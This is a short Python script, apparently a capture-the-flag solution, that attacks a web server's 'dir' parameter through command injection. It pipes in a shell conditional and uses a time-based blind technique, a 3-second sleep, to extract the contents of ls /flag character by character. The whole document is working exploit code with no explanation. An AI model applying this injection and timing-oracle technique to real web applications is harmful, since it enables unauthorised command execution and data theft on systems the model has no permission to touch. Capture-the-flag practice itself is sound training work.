import requests
import string
import time
s=string.ascii_letters+string.digits+"{}+=._! "
url1="http://web1.0ops.sjtu.cn:40018/?dir=|if%20[%20$(ls%20/flag|cut%20-c"
url2=")%20=%20%22"
url3="%22%20];%20then%20sleep%203;%20fi"
for i in range(1,30):
    flg=0
    for each in s:
        beg=time.time()
        url=url1+str(i)+url2+each+url3
        http=requests.get(url)
        if time.time()-beg>=2:
            print(each)
            flg=1
            break
    if flg==0:
        print("NO")
        break
